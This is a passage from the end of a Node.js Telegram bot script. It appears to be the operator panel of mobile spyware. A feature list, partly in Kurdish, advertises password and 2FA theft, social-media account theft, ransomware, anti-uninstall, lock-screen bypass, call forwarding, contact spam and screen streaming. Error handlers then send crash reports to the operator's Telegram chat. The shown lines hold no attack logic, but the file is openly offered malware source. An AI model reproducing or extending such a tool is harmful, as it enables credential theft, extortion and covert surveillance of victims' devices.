        `• دزینی پاسۆرد و 2FA\n` +
        `• دزینی ئەپەکانی سۆشیاڵ میدیا\n` +
        `• ڕانسۆمویر\n` +
        `• پەیوەندی ئینکریپتکراو\n` +
        `• Auto-Restart & Battery Bypass\n` +
        `• Anti-Uninstall & Lock Screen Bypass\n` +
        `• Call Forwarding & Contacts Spam\n` +
        `• App Killer & WiFi/Bluetooth Control\n` +
        `• Self-Destruct & Screen Stream\n\n` +
        `🦁 **7ASHASHE**`
    );
});

// =====================================================
// 🛡️ ERROR HANDLING
// =====================================================
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    bot.sendMessage(CONFIG.CHAT_ID,
        `⚠️ **Uncaught Exception**\n\n${error.message}`,
        { parse_mode: 'Markdown' }
    );
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
    bot.sendMessage(CONFIG.CHAT_ID,
        `⚠️ **Unhandled Rejection**\n\n${reason}`,
        { parse_mode: 'Markdown' }
    );
});
